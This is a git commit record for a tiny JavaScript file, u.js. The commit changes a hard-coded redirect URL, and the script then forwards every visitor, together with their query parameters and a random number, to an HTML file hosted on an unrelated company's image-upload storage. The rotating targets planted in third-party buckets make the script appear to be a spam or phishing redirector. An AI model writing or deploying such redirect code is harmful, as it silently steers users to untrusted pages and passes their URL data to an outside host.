b8565fff344d216c4fdcaa32891b11e5d3e20281
reyalpilareyalpila <167016503+reyalpilareyalpila@users.noreply.github.com>
2024-08-18 22:49:59 +0800

    Update u.js

--- u.js
+++ u.js
@@ -1,4 +1,4 @@
-var urll="https://oss.syounggroup.com/newretail/24081821213125921421598025.html"
+var urll="https://ulpblob.michelin.com.cn/ulp/avatarimg/20240818224840875eb91e0d0-e8ce-430d-abe8-b215dcf0717a.html"
 var params = new URLSearchParams(location.href.split('?')[1]);
   var sjs = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
   window.location.replace(urll + "?" + sjs + "?" + params);
